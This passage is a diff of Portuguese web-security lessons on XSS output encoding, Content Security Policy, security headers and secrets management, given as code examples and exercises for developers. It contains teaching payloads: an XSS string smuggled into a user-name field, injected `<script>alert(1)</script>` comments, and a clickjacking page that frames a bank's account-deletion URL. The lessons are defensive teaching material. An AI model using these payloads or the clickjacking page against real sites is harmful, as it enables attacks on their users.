+                "O escape automático cobre o caso comum, e o que sobra concentra o risco: atributos de URL e a inserção " +
+                "de HTML cru. Em revisão de código, cada `dangerouslySetInnerHTML` (ou `v-html`, `[innerHTML]`) precisa " +
+                "mostrar de onde vem o HTML e onde ele foi sanitizado.",
+            },
+          ],
+          exercise: {
+            problem:
+              "O e-mail de boas-vindas é um HTML montado com template string: o nome da pessoa aparece num título, num " +
+              "atributo `alt` e num link de confirmação com o e-mail como parâmetro. O mesmo template também gera um " +
+              "bloco `<script>` com os dados para uma página de pré-visualização.",
+            problemCode: {
+              language: "javascript",
+              filename: "welcome.js",
+              code: [
+                "function welcomeHtml(user) {",
+                "  return `",
+                "    <h1>Bem-vinda, ${user.name}!</h1>",
+                "    <img src=\"/logo.png\" alt=\"Olá ${user.name}\">",
+                "    <a href=\"https://devatlas.test/confirmar?email=${user.email}\">Confirmar e-mail</a>",
+                "    <script>window.preview = { name: '${user.name}' };</script>`;",
+                "}",
+                "",
+                "const user = { name: `Ana\" onerror=\"alert(1)</script><script>alert(2)//`, email: \"ana+teste@example.test\" };",
+              ].join("\n"),
+            },
+            task:
+              "Aplique a codificação certa a cada um dos quatro contextos e mostre que o nome malicioso sai só como " +
+              "texto e que o `+` do e-mail chega intacto ao parâmetro.",
+            hint:
+              "Título: texto HTML. `alt`: atributo HTML entre aspas. Parâmetro: `encodeURIComponent`. Script: JSON com " +
+              "`<` escapado.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "welcome.fixed.js",
+                code: [
+                  "const htmlText = (s) => String(s).replace(/[&<>]/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\" })[c]);",
+                  "const htmlAttr = (s) => String(s).replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" })[c]);",
+                  "const jsValue = (v) => JSON.stringify(v).replace(/</g, \"\\\\u003c\");",
+                  "",
+                  "function welcomeHtml(user) {",
+                  "  return `",
+                  "    <h1>Bem-vinda, ${htmlText(user.name)}!</h1>",
+                  "    <img src=\"/logo.png\" alt=\"Olá ${htmlAttr(user.name)}\">",
+                  "    <a href=\"https://devatlas.test/confirmar?email=${htmlAttr(encodeURIComponent(user.email))}\">Confirmar e-mail</a>",
+                  "    <script>window.preview = ${jsValue({ name: user.name })};</script>`;",
+                  "}",
+                  "",
+                  "const html = welcomeHtml(user);",
+                  "html.includes('\" onerror=\"');                           // false — o atributo não foi quebrado",
+                  "(html.match(/<\\/script>/g) || []).length;              // 1 — só o fechamento legítimo",
+                  "html.includes(\"email=ana%2Bteste%40example.test\");     // true — sem o encoding, o \"+\" viraria espaço",
+                ].join("\n"),
+              },
+              explanation:
+                "Cada dado passou pela codificação do lugar onde entra. O caso do e-mail mostra que a codificação também " +
+                "é correção, e não só segurança: sem ela, o `+` seria lido como espaço pelo servidor. No link, a URL já " +
+                "codificada ainda passa pelo escape de atributo, porque o valor fica dentro de `href=\"...\"`.",
+            },
+          },
+        }),
+        concept({
+          order: 100,
+          title: "Content Security Policy (CSP)",
+          requires: ["Cross-Site Scripting (XSS)", "Web Fundamentals / HTTP Headers"],
+          note: "defesa em profundidade contra XSS; nonce/hash",
+          summary:
+            "Um cabeçalho de resposta com o qual o site diz ao navegador de onde scripts, estilos, imagens e conexões " +
+            "podem vir — de modo que, mesmo que um XSS consiga injetar marcação, o navegador se recuse a executar o " +
+            "script que não foi autorizado.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "A Content Security Policy é uma lista de regras enviada no cabeçalho `Content-Security-Policy`. Cada " +
+                "diretiva controla um tipo de recurso: `script-src` (scripts), `style-src`, `img-src`, `connect-src` " +
+                "(para onde o `fetch` pode ir), `frame-ancestors` (quem pode embutir a página) e assim por diante. A " +
+                "forma mais eficaz contra XSS é a CSP estrita: todo script legítimo recebe um `nonce` aleatório, gerado a " +
+                "cada resposta, e só scripts com esse nonce executam. Um script injetado por um atacante não tem o nonce " +
+                "e é bloqueado. A CSP não corrige o XSS; ela é uma segunda camada, que reduz muito o estrago quando a " +
+                "primeira falha.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "A CSP é o cinto de segurança do XSS: a correção continua sendo codificar a saída, e a política com nonce " +
+                "faz com que um erro que escape dessa correção não se transforme em código executando na página.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "csp-nonce.js",
+              code: [
+                "import { randomBytes } from \"node:crypto\";",
+                "",
+                "function renderPage({ nonce }) {",
+                "  return `<!doctype html>",
+                "<html><head>",
+                "  <script nonce=\"${nonce}\" src=\"/app.js\"></script>",
+                "</head><body>",
+                "  <div id=\"app\"></div>",
+                "  <script nonce=\"${nonce}\">window.boot();</script>",
+                "</body></html>`;",
+                "}",
+                "",
+                "function handlePage() {",
+                "  const nonce = randomBytes(16).toString(\"base64\");   // novo a cada resposta",
+                "  const csp = [",
+                "    `script-src 'nonce-${nonce}' 'strict-dynamic'`,",
+                "    \"object-src 'none'\",",
+                "    \"base-uri 'none'\",",
+                "    \"frame-ancestors 'none'\",",
+                "  ].join(\"; \");",
+                "  return { headers: { \"content-security-policy\": csp }, body: renderPage({ nonce }) };",
+                "}",
+                "",
+                "const res = handlePage();",
+                "res.headers[\"content-security-policy\"].startsWith(\"script-src 'nonce-\");   // true",
+                "// Um <script>alert(1)</script> injetado num comentário não tem o nonce: o navegador não o executa.",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "`'strict-dynamic'` deixa que scripts já autorizados carreguem outros (bibliotecas que injetam scripts), " +
+                "sem precisar listar domínios. `object-src 'none'` e `base-uri 'none'` fecham caminhos alternativos de " +
+                "execução. O nonce precisa ser imprevisível e novo a cada resposta; um nonce fixo seria copiado pelo " +
+                "atacante.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em toda aplicação com páginas HTML, como defesa em profundidade contra XSS, de preferência com nonce ou hash (CSP estrita).",
+                "Começando em modo de observação (`Content-Security-Policy-Report-Only`) para descobrir o que a política quebraria, antes de aplicá-la.",
+                "Com `frame-ancestors` para impedir que a página seja embutida por outros sites, e `connect-src` para limitar para onde os dados podem ser enviados.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Listas de domínios em `script-src` (\"permitir cdn.exemplo.com\") costumam ser contornáveis, porque os próprios CDNs hospedam scripts que um atacante pode usar.",
+                "`'unsafe-inline'` e `'unsafe-eval'` anulam a maior parte da proteção contra XSS; aplicações que dependem deles precisam ser ajustadas antes.",
+                "A CSP não protege contra o que o script legítimo faz com dados maliciosos (XSS baseado em DOM dentro de código autorizado) nem substitui a codificação da saída.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Observar antes de bloquear",
+              context: "O modo de relatório mostra o que a política bloquearia, sem quebrar nada.",
+              code: {
+                language: "text",
+                filename: "report-only.txt",
+                code: [
+                  "Content-Security-Policy-Report-Only: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none';",
+                  "  base-uri 'none'; report-to csp-endpoint",
+                  "Reporting-Endpoints: csp-endpoint=\"https://devatlas.test/csp-reports\"",
+                  "",
+                  "Relatórios recebidos na primeira semana:",
+                  "  script inline em /checkout (sem nonce)         → corrigir: acrescentar o nonce no template",
+                  "  onclick=\"...\" em /admin/users                  → corrigir: trocar por addEventListener",
+                  "  script de extensão do navegador                → ignorar (não vem do site)",
+                  "",
+                  "Depois de zerar o que é do site: trocar para Content-Security-Policy (aplicar).",
+                ].join("\n"),
+              },
+              explanation:
+                "Aplicar uma CSP estrita direto numa aplicação existente costuma quebrar páginas com scripts inline e " +
+                "atributos `on*`. O modo `Report-Only` mostra esses pontos com dados reais de uso, e a política só passa " +
+                "a bloquear quando o que é legítimo já está autorizado.",
+            },
+            {
+              title: "Hash para scripts inline que não mudam",
+              context: "Em páginas estáticas, sem servidor para gerar nonce, o hash do script também autoriza.",
+              code: {
+                language: "javascript",
+                filename: "csp-hash.js",
+                code: [
+                  "import { createHash } from \"node:crypto\";",
+                  "",
+                  "const inline = \"document.documentElement.dataset.theme = localStorage.getItem('theme') || 'dark';\";",
+                  "const hash = createHash(\"sha256\").update(inline).digest(\"base64\");",
+                  "",
+                  "const csp = `script-src 'sha256-${hash}' 'self'; object-src 'none'; base-uri 'none'`;",
+                  "// <script>document.documentElement.dataset.theme = localStorage.getItem('theme') || 'dark';</script>",
+                  "// executa, porque o hash bate; qualquer script inline diferente — inclusive um injetado — é bloqueado.",
+                  "",
+                  "csp.startsWith(\"script-src 'sha256-\");   // true",
+                ].join("\n"),
+              },
+              explanation:
+                "O hash é calculado sobre o conteúdo exato do script, então qualquer alteração, até um espaço, invalida a " +
+                "autorização. É a opção natural para sites estáticos gerados no build, como este: o hash é calculado " +
+                "junto com a página.",
+            },
+            {
+              title: "Uma CSP que não protege",
+              context: "Políticas longas e permissivas dão a impressão de segurança.",
+              code: {
+                language: "text",
+                filename: "weak-csp.txt",
+                code: [
+                  "Content-Security-Policy: default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+                  "  https://cdn.jsdelivr.net https://www.google-analytics.com",
+                  "",
+                  "Problemas:",
+                  "  'unsafe-inline'          → qualquer <script> injetado executa: não há proteção contra XSS",
+                  "  'unsafe-eval'            → eval() e new Function() liberados",
+                  "  https://cdn.jsdelivr.net → o CDN serve qualquer pacote público, inclusive um feito pelo atacante",
+                  "  default-src ... https:   → qualquer domínio HTTPS para os demais recursos",
+                  "",
+                  "Ferramentas como o CSP Evaluator (do Google) apontam esses problemas automaticamente.",
+                ].join("\n"),
+              },
+              explanation:
+                "Uma política com `'unsafe-inline'` é quase o mesmo que não ter política contra XSS. O valor da CSP está " +
+                "na restrição de onde os scripts podem vir; cada exceção precisa de um bom motivo.",
+            },
+          ],
+          exercise: {
+            problem:
+              "Uma aplicação envia a CSP `script-src 'self' 'unsafe-inline'` porque as páginas têm dois scripts inline. " +
+              "Um XSS armazenado, achado num teste, executou normalmente apesar da CSP.",
+            problemCode: {
+              language: "javascript",
+              filename: "page.js",
+              code: [
+                "function handlePage(comments) {",
+                "  const body = `<!doctype html><html><body>",
+                "    <script>window.config = { apiUrl: \"/api\" };</script>",
+                "    <ul>${comments.map((c) => `<li>${c}</li>`).join(\"\")}</ul>",
+                "    <script src=\"/app.js\"></script>",
+                "    <script>startApp();</script>",
+                "  </body></html>`;",
+                "  return { headers: { \"content-security-policy\": \"script-src 'self' 'unsafe-inline'\" }, body };",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Troque a política por uma CSP estrita com nonce por resposta, marque os três scripts legítimos com o " +
+              "nonce e mostre que um comentário com `<script>` fica sem nonce. (Codificar os comentários continua sendo " +
+              "necessário.)",
+            hint:
+              "Gere o nonce com `randomBytes`, use-o no cabeçalho (`'nonce-...' 'strict-dynamic'`) e em cada `<script>` " +
+              "do template.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "page.fixed.js",
+                code: [
+                  "import { randomBytes } from \"node:crypto\";",
+                  "const escapeHtml = (s) => String(s).replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" })[c]);",
+                  "",
+                  "function handlePage(comments) {",
+                  "  const nonce = randomBytes(16).toString(\"base64\");",
+                  "  const body = `<!doctype html><html><body>",
+                  "    <script nonce=\"${nonce}\">window.config = { apiUrl: \"/api\" };</script>",
+                  "    <ul>${comments.map((c) => `<li>${escapeHtml(c)}</li>`).join(\"\")}</ul>",
+                  "    <script nonce=\"${nonce}\" src=\"/app.js\"></script>",
+                  "    <script nonce=\"${nonce}\">startApp();</script>",
+                  "  </body></html>`;",
+                  "  const csp = `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`;",
+                  "  return { headers: { \"content-security-policy\": csp }, body, nonce };",
+                  "}",
+                  "",
+                  "const res = handlePage([\"<script>alert(1)</script>\"]);",
+                  "(res.body.match(new RegExp(`nonce=\"${res.nonce.replace(/[+/=]/g, \"\\\\$&\")}\"`, \"g\")) || []).length;   // 3 — só os legítimos",
+                  "res.body.includes(\"<li>&lt;script&gt;\");                                                         // true — o comentário virou texto",
+                  "handlePage([]).nonce === res.nonce;                                                              // false — novo a cada resposta",
+                ].join("\n"),
+              },
+              explanation:
+                "Com `'unsafe-inline'`, a política autorizava qualquer script inline, inclusive o injetado. Com o nonce, " +
+                "só os três scripts marcados pelo servidor executam, e um script que escape da codificação no futuro será " +
+                "bloqueado pelo navegador. As duas camadas juntas é que dão a proteção.",
+            },
+          },
+        }),
+        concept({
+          order: 110,
+          title: "Security Headers",
+          requires: ["Web Fundamentals / HTTP Headers"],
+          note: "HSTS, X-Content-Type-Options, frame-ancestors, Referrer-Policy",
+          summary:
+            "Cabeçalhos de resposta que ligam proteções do navegador: impedir que ele adivinhe o tipo do conteúdo, " +
+            "que a página seja embutida por outros sites, que a URL vaze para terceiros no `Referer` e que recursos " +
+            "como câmera e localização sejam usados sem necessidade.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Muitas proteções dos navegadores vêm desligadas por compatibilidade e são ligadas por cabeçalhos. Os " +
+                "principais: `Strict-Transport-Security` (HSTS, forçar HTTPS), `X-Content-Type-Options: nosniff` (não " +
+                "reinterpretar um arquivo como script ou HTML por causa do conteúdo), `frame-ancestors` na CSP (ou o " +
+                "antigo `X-Frame-Options`), que diz quem pode embutir a página e protege contra clickjacking, " +
+                "`Referrer-Policy`, que limita o que a URL de origem revela ao navegar para outros sites, e " +
+                "`Permissions-Policy`, que desliga recursos como câmera, microfone e geolocalização onde não são usados. " +
+                "Custam pouco e fecham classes inteiras de ataques.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Os cabeçalhos de segurança são configurações baratas com efeito amplo: defina-os num único lugar, para " +
+                "todas as respostas, e confira-os automaticamente, em vez de lembrar deles rota a rota.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "headers.js",
+              code: [
+                "// Um middleware aplica os cabeçalhos a todas as respostas",
+                "const SECURITY_HEADERS = {",
+                "  \"strict-transport-security\": \"max-age=63072000; includeSubDomains\",   // 2 anos só HTTPS (ver TLS)",
+                "  \"x-content-type-options\": \"nosniff\",",
+                "  \"content-security-policy\": \"frame-ancestors 'none'\",                   // ninguém embute esta página",
+                "  \"referrer-policy\": \"strict-origin-when-cross-origin\",                  // outros sites só veem o domínio",
+                "  \"permissions-policy\": \"camera=(), microphone=(), geolocation=()\",      // recursos desligados",
+                "  \"cross-origin-opener-policy\": \"same-origin\",",
+                "};",
+                "",
+                "function withSecurityHeaders(handler) {",
+                "  return (req) => {",
+                "    const res = handler(req);",
+                "    return { ...res, headers: { ...SECURITY_HEADERS, ...res.headers } };",
+                "  };",
+                "}",
+                "",
+                "// Verificação automática, útil num teste de integração",
+                "const missing = (headers) => Object.keys(SECURITY_HEADERS).filter((name) => !(name in headers));",
+                "",
+                "const handler = withSecurityHeaders(() => ({ status: 200, headers: { \"content-type\": \"text/html\" }, body: \"<h1>Oi</h1>\" }));",
+                "missing(handler({}).headers);   // [] — todos presentes",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A CSP completa, com o controle de scripts, costuma ser definida por página; aqui ela aparece só com " +
+                "`frame-ancestors`, que vale para todas. Um teste que confere os cabeçalhos numa resposta real pega o dia " +
+                "em que alguém trocar o servidor ou o proxy e eles sumirem.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em todas as respostas da aplicação, aplicados por um middleware, pelo proxy reverso ou pela CDN — num lugar só.",
+                "`nosniff` sempre, e com mais razão em sites que servem arquivos enviados por usuários.",
+                "`frame-ancestors 'none'` (ou a lista exata de quem pode embutir) em páginas com ações sensíveis, contra clickjacking.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "HSTS com `includeSubDomains` e `preload` é difícil de desfazer: um subdomínio que ainda precise de HTTP deixa de funcionar por meses.",
+                "Cabeçalhos protegem o navegador; não fazem nada por clientes que os ignoram, como scripts e integrações, nem corrigem falhas no servidor.",
+                "`X-XSS-Protection` e `Expect-CT` foram abandonados pelos navegadores; incluí-los só acrescenta ruído, e o primeiro já causou problemas.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Clickjacking e frame-ancestors",
+              context: "Outro site embute a sua página invisível, por cima de um botão chamativo.",
+              code: {
+                language: "text",
+                filename: "clickjacking.html",
+                code: [
+                  "<!-- em https://evil.test -->",
+                  "<style>",
+                  "  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 600px; height: 400px; z-index: 2; }",
+                  "  button { position: absolute; top: 180px; left: 220px; z-index: 1; }",
+                  "</style>",
+                  "<button>Ganhe um prêmio!</button>",
+                  "<iframe src=\"https://banco.test/conta/excluir\"></iframe>",
+                  "",
+                  "O clique vai para o iframe invisível, logado como a vítima.",
+                  "",
+                  "Defesa (na resposta de banco.test):",
+                  "  Content-Security-Policy: frame-ancestors 'none'      ← navegadores atuais",
+                  "  X-Frame-Options: DENY                                ← navegadores antigos",
+                ].join("\n"),
+              },
+              explanation:
+                "Com `frame-ancestors 'none'`, o navegador se recusa a mostrar a página dentro de um iframe de outro " +
+                "site, e o truque perde o efeito. Se a página precisar ser embutida por um parceiro, a diretiva lista " +
+                "exatamente as origens permitidas.",
+            },
+            {
+              title: "O que o Referer revela",
+              context: "A URL da página atual vai para o próximo site, a menos que a política limite.",
+              code: {
+                language: "javascript",
+                filename: "referrer.js",
+                code: [
+                  "// Página com dados na URL: https://app.devatlas.test/reset?token=abc123&email=ana%40example.test",
+                  "// A página tem um link para a documentação de um terceiro. Sem política, o terceiro recebe:",
+                  "//   Referer: https://app.devatlas.test/reset?token=abc123&email=ana%40example.test",
+                  "",
+                  "// strict-origin-when-cross-origin (padrão atual dos navegadores, mas vale declarar):",
+                  "//   mesmo site     → URL completa",
+                  "//   outro site     → só a origem: Referer: https://app.devatlas.test/",
+                  "//   HTTPS → HTTP   → nada",
+                  "",
+                  "function refererFor(policy, from, to) {",
+                  "  const a = new URL(from);",
+                  "  const b = new URL(to);",
+                  "  if (policy === \"no-referrer\") return null;",
+                  "  if (a.origin === b.origin) return a.href;",
+                  "  if (a.protocol === \"https:\" && b.protocol === \"http:\") return null;",
+                  "  return `${a.origin}/`;",
+                  "}",
+                  "",
+                  "refererFor(\"strict-origin-when-cross-origin\", \"https://app.devatlas.test/reset?token=abc123\", \"https://docs.terceiro.test/\");",
+                  "// \"https://app.devatlas.test/\"",
+                ].join("\n"),
+              },
+              explanation:
+                "Tokens e dados pessoais em URLs vazam pelo `Referer` para qualquer site linkado, e ainda aparecem nos " +
+                "logs de quem os recebe. A política limita o vazamento; a correção de fundo é não colocar segredos em " +
+                "URLs.",
+            },
+            {
+              title: "Conferir numa resposta real",
+              context: "Uma verificação rápida numa URL de produção, com o `fetch` do Node.",
+              code: {
+                language: "javascript",
+                filename: "check-headers.js",
+                code: [
+                  "const REQUIRED = [\"strict-transport-security\", \"x-content-type-options\", \"referrer-policy\", \"content-security-policy\"];",
+                  "",
+                  "async function checkSecurityHeaders(url) {",
+                  "  const res = await fetch(url, { method: \"HEAD\" });",
+                  "  return REQUIRED.filter((name) => !res.headers.has(name));",
+                  "}",
+                  "",
+                  "// Num pipeline de deploy: falha se algum cabeçalho sumir",
+                  "// const missing = await checkSecurityHeaders(\"https://devatlas.test/\");",
+                  "// if (missing.length) { console.error(\"faltando:\", missing); process.exit(1); }",
+                ].join("\n"),
+              },
+              explanation:
+                "Os cabeçalhos costumam sumir sem que ninguém perceba: uma troca de proxy, uma nova CDN, uma rota servida " +
+                "por outro servidor. Conferir numa resposta real, depois de cada deploy, transforma esse sumiço num " +
+                "alerta.",
+            },
+          ],
+          exercise: {
+            problem:
+              "Um site que serve arquivos enviados por usuários (anexos de chamados) responde sem nenhum cabeçalho de " +
+              "segurança. Um teste mostrou que um anexo `.txt` com HTML dentro era exibido como página, e que o painel " +
+              "podia ser embutido em qualquer site.",
+            problemCode: {
+              language: "javascript",
+              filename: "attachments.js",
+              code: [
+                "function serveAttachment(file) {",
+                "  return { status: 200, headers: { \"content-type\": file.mimeType }, body: file.bytes };   // mimeType veio do upload",
+                "}",
+                "",
+                "function servePanel() {",
+                "  return { status: 200, headers: { \"content-type\": \"text/html\" }, body: \"<h1>Painel</h1>\" };",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Aplique os cabeçalhos de segurança a todas as respostas e, nos anexos, force o download com um tipo " +
+              "seguro, sem confiar no tipo informado no upload.",
+            hint:
+              "`nosniff` impede a reinterpretação; `Content-Disposition: attachment` força o download; " +
+              "`application/octet-stream` evita que o navegador exiba o conteúdo.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "attachments.fixed.js",
+                code: [
+                  "const SECURITY_HEADERS = {",
+                  "  \"x-content-type-options\": \"nosniff\",",
+                  "  \"content-security-policy\": \"frame-ancestors 'none'\",",
+                  "  \"referrer-policy\": \"strict-origin-when-cross-origin\",",
+                  "  \"strict-transport-security\": \"max-age=63072000; includeSubDomains\",",
+                  "};",
+                  "const secure = (res) => ({ ...res, headers: { ...SECURITY_HEADERS, ...res.headers } });",
+                  "",
+                  "function serveAttachment(file) {",
+                  "  const safeName = file.name.replace(/[^\\w.-]/g, \"_\");",
+                  "  return secure({",
+                  "    status: 200,",
+                  "    headers: {",
+                  "      \"content-type\": \"application/octet-stream\",                      // nunca o tipo enviado no upload",
+                  "      \"content-disposition\": `attachment; filename=\"${safeName}\"`,     // baixar, e não exibir",
+                  "      \"content-security-policy\": \"default-src 'none'; sandbox\",         // se algo for exibido, não executa nada",
+                  "    },",
+                  "    body: file.bytes,",
+                  "  });",
+                  "}",
+                  "",
+                  "const servePanel = () => secure({ status: 200, headers: { \"content-type\": \"text/html\" }, body: \"<h1>Painel</h1>\" });",
+                  "",
+                  "const res = serveAttachment({ name: 'nota\"; x.txt', mimeType: \"text/html\", bytes: \"<script>alert(1)</script>\" });",
+                  "res.headers[\"content-type\"];          // \"application/octet-stream\"",
+                  "res.headers[\"content-disposition\"];   // 'attachment; filename=\"nota___x.txt\"'",
+                  "servePanel().headers[\"content-security-policy\"];   // \"frame-ancestors 'none'\"",
+                ].join("\n"),
+              },
+              explanation:
+                "O anexo deixou de ser tratado como página: tipo genérico, download forçado, `nosniff` e uma CSP que " +
+                "proíbe tudo. O nome do arquivo também é limpo, porque ele vai dentro de um cabeçalho. Servir os anexos a " +
+                "partir de outro domínio, sem cookies do painel, seria a camada seguinte.",
+            },
+          },
+        }),
         concept({
           order: 120,
           title: "Secrets Management",
           note: "rotação, nunca em VCS — revisita Software Craft (.gitignore, história do Git)",
           collision: "≠ Environments & Configuration (CI/CD) ≠ Secret Manager serviço (Cloud Security) ≠ K8s Secret",
+          summary:
+            "Cuidar do ciclo de vida das credenciais que o sistema usa — senhas de banco, chaves de API, chaves de " +
+            "assinatura —: nunca no código nem no Git, entregues à aplicação em tempo de execução, com acesso mínimo, " +
+            "rotação periódica e plano para quando vazarem.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Segredos são os valores que dão acesso a algo: a senha do banco, a chave da API de pagamentos, o segredo " +
+                "que assina tokens. Gerenciá-los é garantir que eles fiquem fora do código-fonte e do controle de versão, " +
+                "sejam entregues à aplicação só no momento de rodar (variáveis de ambiente, arquivos montados, um cofre " +
+                "de segredos), sejam acessíveis só a quem precisa, possam ser trocados (rotação) sem parar o sistema e " +
+                "não apareçam em logs e mensagens de erro. O histórico do Git guarda tudo o que já foi commitado: um " +
+                "segredo que passou por lá deve ser considerado vazado, mesmo depois de apagado.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Segredo que passou pelo Git está vazado: a resposta é revogar e trocar, e não só apagar o arquivo — e o " +
+                "objetivo do processo é que trocar um segredo seja rotina, e não um projeto.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "config.js",
+              code: [
+                "// Configuração lida do ambiente, validada na inicialização",
+                "function loadConfig(env) {",
+                "  const required = [\"DATABASE_URL\", \"PAYMENTS_API_KEY\", \"SESSION_SECRET\"];",
+                "  const missing = required.filter((name) => !env[name]);",
+                "  if (missing.length) throw new Error(`configuração ausente: ${missing.join(\", \")}`);   // falha cedo, sem o valor",
+                "  if (env.SESSION_SECRET.length < 32) throw new Error(\"SESSION_SECRET: mínimo de 32 caracteres\");",
+                "  return Object.freeze({",
+                "    databaseUrl: env.DATABASE_URL,",
+                "    paymentsApiKey: env.PAYMENTS_API_KEY,",
+                "    sessionSecret: env.SESSION_SECRET,",
+                "  });",
+                "}",
+                "",
+                "// Nos logs, segredos aparecem mascarados",
+                "const SECRET_KEYS = /secret|password|token|api[_-]?key|authorization/i;",
+                "const redact = (obj) =>",
+                "  JSON.parse(JSON.stringify(obj, (key, value) => (SECRET_KEYS.test(key) && typeof value === \"string\" ? \"***\" : value)));",
+                "",
+                "try { loadConfig({ DATABASE_URL: \"postgres://...\" }); } catch (error) { error.message; }",
+                "// \"configuração ausente: PAYMENTS_API_KEY, SESSION_SECRET\"",
+                "",
+                "redact({ user: \"ana\", paymentsApiKey: \"sk_live_abc\", headers: { authorization: \"Bearer xyz\" } });",
+                "// { user: \"ana\", paymentsApiKey: \"***\", headers: { authorization: \"***\" } }",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A aplicação não sabe de onde os valores vêm: em desenvolvimento, de um arquivo `.env` fora do Git; em " +
+                "produção, do cofre de segredos da plataforma, injetado como variável ou arquivo. Faltar um segredo " +
+                "derruba a inicialização com uma mensagem clara, em vez de um erro confuso na primeira requisição.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Para toda credencial do sistema: bancos, filas, APIs de terceiros, chaves de assinatura e de criptografia, tokens de CI.",
+                "Com um cofre (Vault, os gerenciadores de segredos das nuvens) quando há vários ambientes, várias pessoas e necessidade de auditoria e rotação.",
+                "Com varredura automática de segredos no repositório e no pipeline, para pegar o commit antes de ele chegar ao remoto.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Variáveis de ambiente aparecem em dumps de processo, relatórios de erro e ferramentas de diagnóstico; elas são o transporte, e não um cofre.",
+                "Criptografar segredos no repositório só desloca o problema para a chave que os decifra, que precisa de todo o mesmo cuidado.",
+                "Nenhuma ferramenta resolve segredos compartilhados por muita gente e nunca trocados; o processo de rotação é o que limita o dano de um vazamento.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Apagar o arquivo não apaga o segredo",
+              context: "O histórico do Git guarda cada versão de cada arquivo commitado.",
+              code: {
+                language: "text",
+                filename: "git-history.txt",
+                code: [
+                  "$ git log --oneline",
+                  "a91f2c3 remove .env que foi commitado sem querer",
+                  "7be04d1 configura pagamentos            ← o .env com a chave está aqui",
+                  "",
+                  "$ git show 7be04d1:.env",
+                  "PAYMENTS_API_KEY=sk_live_51Hc...        ← qualquer pessoa com acesso ao repositório (ou a um clone antigo) lê",
+                  "",
+                  "Ordem certa quando um segredo vaza:",
+                  "  1. revogar/trocar o segredo no provedor (agora)",
+                  "  2. procurar uso indevido nos logs do provedor",
+                  "  3. só então, se fizer sentido, reescrever o histórico (git filter-repo) — os clones antigos continuam com ele",
+                  "  4. impedir a repetição: .gitignore, varredura de segredos no pre-commit e no CI",
+                ].join("\n"),
+              },
+              explanation:
+                "Reescrever o histórico não alcança os clones, forks e caches que já baixaram o commit; a única resposta " +
+                "confiável é trocar o segredo. A limpeza do histórico, quando feita, é higiene, e não correção.",
+            },
+            {
+              title: "Rotação sem parada: aceitar dois por um tempo",
+              context: "Trocar o segredo que assina sessões não pode derrubar todo mundo.",
+              code: {
+                language: "javascript",
+                filename: "rotation.js",
+                code: [
+                  "import { createHmac, timingSafeEqual } from \"node:crypto\";",
+                  "",
+                  "// Durante a rotação: assina com o novo, aceita o novo e o anterior",
+                  "const keys = { current: \"segredo-novo-com-32-caracteres!!!\", previous: \"segredo-antigo-com-32-caracteres!\" };",
+                  "",
+                  "const sign = (value, key = keys.current) => createHmac(\"sha256\", key).update(value).digest(\"base64url\");",
+                  "function verify(value, signature) {",
+                  "  return [keys.current, keys.previous].filter(Boolean).some((key) => {",
+                  "    const expected = Buffer.from(sign(value, key));",
+                  "    const got = Buffer.from(signature);",
+                  "    return expected.length === got.length && timingSafeEqual(expected, got);",
+                  "  });",
+                  "}",
+                  "",
+                  "const oldCookie = sign(\"user-7\", keys.previous);   // emitido antes da rotação",
+                  "verify(\"user-7\", oldCookie);                        // true — continua válido durante a transição",
+                  "keys.previous = null;                               // depois do prazo máximo das sessões antigas",
+                  "verify(\"user-7\", oldCookie);                        // false",
+                ].join("\n"),
+              },
+              explanation:
+                "A rotação em duas etapas — passar a assinar com o novo aceitando os dois, e depois descartar o antigo — " +
+                "troca o segredo sem deslogar ninguém. O mesmo padrão vale para senhas de banco (dois usuários) e chaves " +
+                "de API (duas chaves ativas por um período).",
+            },
+            {
+              title: "Varredura de segredos antes do commit",
+              context: "Ferramentas procuram padrões de chaves conhecidas e textos de alta entropia.",
+              code: {
+                language: "javascript",
+                filename: "scan.js",
+                code: [
